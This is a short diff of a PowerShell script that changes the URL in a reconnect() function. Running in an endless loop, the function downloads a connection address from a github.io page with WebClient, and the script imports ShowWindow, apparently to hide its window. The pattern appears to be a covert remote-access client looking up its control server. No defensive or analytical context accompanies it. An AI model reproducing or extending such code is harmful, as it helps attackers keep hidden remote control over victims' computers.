@@ -11,7 +11,7 @@ public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
 
 while($true) {
     function reconnect() {
-        $address = "https://80m83rm4n.github.io/connect"
+        $address = "https://80m83rm4n.github.io/connect.txt"
         $request = New-Object System.Net.WebClient;
         $request.Headers.add('accept','application/json');
         $address = $request.DownloadString("$address"); 
